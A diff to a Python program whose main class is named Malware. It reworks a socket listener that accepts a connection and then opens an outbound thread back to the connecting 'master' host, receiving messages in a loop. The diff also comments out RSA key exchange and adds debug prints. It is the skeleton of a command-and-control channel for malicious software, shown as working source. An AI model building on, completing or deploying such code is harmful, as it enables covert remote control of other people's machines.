@@ -30,24 +30,26 @@ class InThread(threading.Thread):
     def __init__(self, in_port=IN_PORT):
         super().__init__()
         self.in_port = in_port
-        self.conn = None
-        self.in_ip = None
         self.socket = socket.socket()
+        self.start_inThread()
 
     def start_inThread(self):
         try:
             self.socket.bind(('', self.in_port))
-            self.socket.listen(1)
-            self.conn, self.in_ip = self.socket.accept()
-            self.init_public_key()
-            malw.start_out_thread(self.in_ip)
+            self.socket.listen(5)
+            print('listening for incoming traffic')
+            self.start()
         except timeout:
             self.start_inThread()
 
     def run(self):
+        conn, in_ip = self.socket.accept()
+        print('connection received')
+        #self.init_public_key()
+        malw.start_out_thread(in_ip)
         again = True
         while again:
-            msg = self.conn.recv(1024).decode('UTF-8')
+            msg = conn.recv(1024).decode('UTF-8')
             if msg == 'exit':
                 again = False
             else:
@@ -86,10 +88,11 @@ class OutThread(threading.Thread):
         try:
             self.sock = socket.socket()
             self.sock.connect((self.ip, self.out_port))
+            print('trying to connect to master')
         except ConnectionError:
             print('Unable to connect to {}'.format(self.ip))
 
-        self.send_public_keys()
+        #self.send_public_keys()
 
     def run(self):
         again = True
@@ -153,8 +156,8 @@ class Malware():
 
         global private_key
         global public_key_pem
-        private_key = self.generate_rsa_keys()
-        public_key_pem = self.serialize_public_key(private_key.public_key())
+        #private_key = self.generate_rsa_keys()
+        #public_key_pem = self.serialize_public_key(private_key.public_key())
 
     def start_out_thread(self, out_ip):
         self.ip = out_ip
@@ -185,8 +188,7 @@ class Malware():
             format=serialization.PublicFormat.SubjectPublicKeyInfo)
 
 
-if len(sys.argv) == 2:
-    ip = sys.argv[1]
+if len(sys.argv) == 1:
     malw = Malware()
 else:
     print_help()
